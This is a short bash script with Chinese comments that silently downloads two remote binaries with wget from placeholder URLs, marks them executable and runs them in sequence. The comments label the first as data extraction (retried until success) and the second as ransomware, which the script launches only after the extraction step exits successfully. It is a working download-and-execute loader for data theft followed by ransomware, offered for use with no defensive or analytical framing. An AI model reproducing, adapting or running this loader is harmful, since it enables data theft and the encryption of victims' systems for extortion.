#!/bin/bash

# 定义下载链接（请替换为实际URL）
URL1="https://example.com/x1.elf" # 提取 重复运行，失败重跑 50次上限，检测成功
URL2="https://example.com/x2.elf" # 勒索

# 并行启动wget静默下载
wget -q "$URL1" -O x1.sh &
pid1=$!  # 获取x1下载进程ID

wget -q "$URL2" -O x2.sh &
pid2=$!  # 获取x2下载进程ID

# 等待x1下载完成
wait $pid1

# 如果下载失败，退出
if [ ! -f x1.sh ]; then
    echo "x1下载失败"
    exit 1
fi

# 赋予执行权限并运行x1
chmod +x x1.sh
./x1.sh
exit_code=$?

# 检查x1退出码，如果为0或1，则继续
if [ $exit_code -eq 0 ] || [ $exit_code -eq 1 ]; then
    # 等待x2下载完成（如果尚未完成）
    wait $pid2

    # 如果下载失败，退出
    if [ ! -f x2.sh ]; then
        echo "x2下载失败"
        exit 1
    fi

    # 赋予执行权限并运行x2
    chmod +x x2.sh
    ./x2.sh
else
    echo "x1执行失败（退出码: $exit_code），不启动x2"
fi

# 清理下载文件（可选，根据需要注释掉）
# rm -f x1.sh x2.sh
